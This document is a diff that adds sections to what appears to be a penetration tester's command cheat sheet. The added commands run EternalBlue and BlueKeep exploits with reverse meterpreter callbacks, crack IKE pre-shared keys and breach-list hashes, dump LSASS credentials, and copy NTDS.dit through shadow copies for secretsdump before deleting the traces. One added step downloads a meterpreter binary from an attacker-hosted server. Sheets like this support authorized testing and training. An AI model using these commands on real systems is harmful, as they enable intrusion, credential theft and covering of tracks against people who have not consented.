@@ -210,6 +210,7 @@ enum4linux -o <ip>
 python /opt/nullinux/nullinux.py -all <ip>
 
 use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/smb/pipe_auditor
 set RHOSTS  <IP>
 run 
 
@@ -250,6 +251,7 @@ https://msdn.microsoft.com/en-us/library/ee441843.aspx
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 pth-smbclient -U "" -I <ip> //<ip>/<share>
+pth-smbclient -U <username>%<hash> //<ip>/<share>
 
 rpcclient -U "" target
 	srvinfo
@@ -318,6 +320,36 @@ http://localhost:7474/
 change password
 bloodhound
 
+
+##############################
+## IKE Internet Key Exchange #
+##############################
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-2/
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-3/
+
+ike-scan <ip> -M -A
+	-M multiline
+	-A aggressive mode
+
+ike-scan <ip> -M -A --id=groupnamedoesnotexist
+ike-scan <ip> -M -A --id=groupnamedoesnotexist -P
+	-P return payload (includes hash)
+
+#if you receive DPD (Dead Peer Detection) in response & system is unpatched, group name is correct
+#CVE-2013-1194
+#DPD can be disabled by configuration, default is enabled
+
+#another way
+# 4 isakmp responses = correct group name
+# 2 ikakmp responses = incorrect group name
+
+hashcat -m 5300 <psk file> -a 3 ?a?a?a?a?a?a -u 1024 -n 800
+
+#if successful crack, XAUTH still required, in theory can be brute forced
+
+
+
 ##############################
 ######## SMTP ENUM ###########
 ##############################
@@ -329,6 +361,16 @@ VRFY <username>
 
 smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t 192.168.2.4
 tcpdump -Aqi tap0 tcp port 25 | grep VRFY
+
+##############################
+##### IDENT ENUM #############
+##############################
+10.60.16.110  113   tcp    ident  open          
+#id which user is running a service
+apt-get install ident-user-enum
+ident-user-enum 10.60.16.110 22
+10.60.16.110:22 0
+
 
 ##############################
 ######## SNMP ENUM ###########
@@ -395,6 +437,39 @@ set payload windows/meterpreter/reverse_https
 set LHOST 10.11.0.164
 set LPORT 4444
 set RHOST 10.11.1.227
+
+##############################
+#### ETERNALBLUE       #######
+##############################
+use exploit/windows/smb/ms17_010_eternalblue_win8
+set RHOST <ip>
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <ip>
+set LPORT 8443
+set ExitOnSession false
+set GroomAllocations 20
+run
+
+##############################
+#### BLUEKEEP          #######
+##############################
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS <ip>
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST <ip>
+set LPORT 8443
+set GROOMSIZE 50
+check
+
+
+##############################
+#### HASHCAT         #########
+##############################
+hashcat -m 1000 -a0 sambaNTPassword.txt breachcompilation.txt
+hashcat -m 3000 -a0 sambaLMPassword.txt breachcompilation.txt
+hashcat -O -m 1800 -a0 root.txt breachcompilation.txt
+hashcat -m 500 -a0 -O root_sha1.txt breachcompilation.txt
+
 
 ##############################
 #### HYDRA     #########
@@ -469,10 +544,26 @@ mimikatz_command -f crypto::listCertificates
 
 mimikatz_command -f event::clear
 
+#new mimi
+load kiwi
+creds_all
 
 
 # if UseLogonCredential set to 1, lsass will store clear-text passwords in mem
 reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+
+###################################
+####   PROCDUMP               #####
+###################################
+pip3 install pypykatz
+
+put /opt/sysinternals/procdump64.exe
+procdump64 -accepteula -64 -ma lsass.exe lsassdump
+get lsassdump.dmp
+del lsassdump.dmp
+
+pypykatz minidump lsassdump.dmp
+
 
 ###################################
 ####   DNS ENUM               #####
@@ -543,6 +634,13 @@ tcpdump -vnni tap0 tcp port 80
 
 
 ###################################
+#### FTP DOWNLOAD            ######
+###################################
+pythom -m SimpleHTTPServer 8443
+ftp -o /tmp/linux_met "http://10.91.42.151:8443/linux_met"
+
+
+###################################
 #### CURL                    ######
 ###################################
 curl -F "file=@my_file.txt" http://server/upload.php
@@ -607,6 +705,27 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 openssl s_client -connect 10.11.90.128:8443 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > ../10.11.90.128/mycert.pem
 
 wget https:/server.edu:443/somepage --ca-certificate=mycertfile.pem
+
+
+##############################
+####### APACHE JSERV #########
+##############################
+apt install libapache2-mod-jk
+a2enmod proxy_ajp
+
+vi /etc/apache2/sites-enabled/ajp.conf
+ProxyRequests Off
+# Only allow localhost to proxy requests
+<Proxy *>
+Order deny,allow
+Deny from all
+Allow from localhost
+</Proxy>
+# Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance
+ProxyPass                 / ajp://10.60.11.36:8009/
+ProxyPassReverse    / ajp://10.60.11.36:8009/
+
+service apache2 start
 
 
 ###################################
@@ -806,6 +925,37 @@ wmic ntevent where "message like '%logon%" GET TimeGenerated
 #u 	Microsecond
 #- 	Literally, a -
 #Z 	Timezone offset in minutes from UTC (not hours)
+#shadow copy
+wmic shadowcopy call create Volume=C:\
+{
+        ReturnValue = 0;
+        ShadowID = "{B6063AED-3F9B-4A75-B16E-6B1AFCDAD6CB}";
+};
+
+wmic shadowcopy where "ID='{B6063AED-3F9B-4A75-B16E-6B1AFCDAD6CB}'" get DeviceObject
+\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+#need to delete
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+get C:\Windows\Temp\ntds.dit
+python /usr/share/doc/python-impacket/examples/secretsdump.py -ntds ntds.dit -system system LOCAL > secrets.txt
+
+###################################
+#### VSSADMIN                ######
+###################################
+dir C:\Windows\NTDS\ntds.dit
+vssadmin create shadow /for=C:
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {d1fcd10a-a64b-42f6-877e-632ccb62e6d8}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+get C:\Windows\Temp\ntds.dit
+del C:\Windows\Temp\ntds.dit
+vssadmin delete shadows /shadow={d1fcd10a-a64b-42f6-877e-632ccb62e6d8} /quiet
+
+python /usr/share/doc/python-impacket/examples/secretsdump.py -ntds ntds.dit -system system LOCAL > secrets.txt
 
 ###################################
 #### WINDOWS ROUTES           #####
@@ -958,6 +1108,7 @@ cat /etc/sysconfig/network
 cat /etc/resolv.conf
 cat /etc/sysconfig/network
 cat /etc/networks
+cat /etc/nsswitch.conf
 iptables -L
 hostname
 dnsdomainname
